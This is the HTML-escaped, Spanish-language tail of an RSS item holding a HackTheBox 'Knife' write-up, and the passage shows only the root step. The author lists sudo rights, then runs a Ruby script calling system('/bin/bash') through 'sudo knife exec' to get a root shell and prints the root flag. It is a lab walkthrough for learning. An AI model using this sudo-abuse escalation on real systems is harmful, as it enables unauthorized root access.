&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;james@knife:~$ sudo -l -l
Matching Defaults entries &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; james on knife:
    env_reset, mail_badpass,
    &lt;span class=&#34;nv&#34;&gt;secure_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/snap/bin

User james may run the following commands on knife:

Sudoers entry:
    RunAsUsers: root
    Options: !authenticate
    Commands:
	/usr/bin/knife
james@knife:~$ file /usr/bin/knife
/usr/bin/knife: symbolic link to /opt/chef-workstation/bin/knife
james@knife:~$ file /opt/chef-workstation/bin/knife
/opt/chef-workstation/bin/knife: a /opt/chef-workstation/embedded/bin/ruby --disable-gems script, ASCII text executable
james@knife:~$ ls -lah /opt/chef-workstation/bin/knife
-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root 12K Feb &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 22:06 /opt/chef-workstation/bin/knife
james@knife:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos &lt;a href=&#34;https://docs.chef.io/workstation/knife_exec/&#34;&gt;knife exec&lt;/a&gt; con un script para obtener una shell root y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;james@knife:~$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;system(&amp;#39;/bin/bash&amp;#39;)&amp;#34;&lt;/span&gt; &amp;gt; script.rb
james@knife:~$ cat script.rb
system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/bash&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
james@knife:~$ sudo /usr/bin/knife &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; script.rb
root@knife:/home/james# whoami
root
root@knife:/home/james# id
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@knife:/home/james# &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt;
root@knife:~# ll
total &lt;span class=&#34;m&#34;&gt;56&lt;/span&gt;
drwx------  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 13:26 ./
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 13:25 ../
lrwxrwxrwx  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root    &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 16:43 .bash_history -&amp;gt; /dev/null
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;3137&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 11:12 .bashrc
drwx------  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:47 .cache/
drwx------  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 13:20 .chef/
-rwxr-xr-x  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;105&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 16:46 delete.sh*
drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 11:13 .local/
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;161&lt;/span&gt; Dec  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; .profile
-rw-------  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 11:13 .rnd
-r--------  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 20:25 root.txt
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;66&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 16:46 .selected_editor
drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 14:44 snap/
drwx------  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 14:44 .ssh/
-rw-------  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;2413&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 13:25 .viminfo
root@knife:~# cat root.txt
e2eee2ca199ac8ea06e9578969576706
root@knife:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/knife/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/knife/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>php</category>
            
          
            
              <category>backdoor</category>
            
          
            
              <category>knife tool</category>
            
          
            
              <category>ruby</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>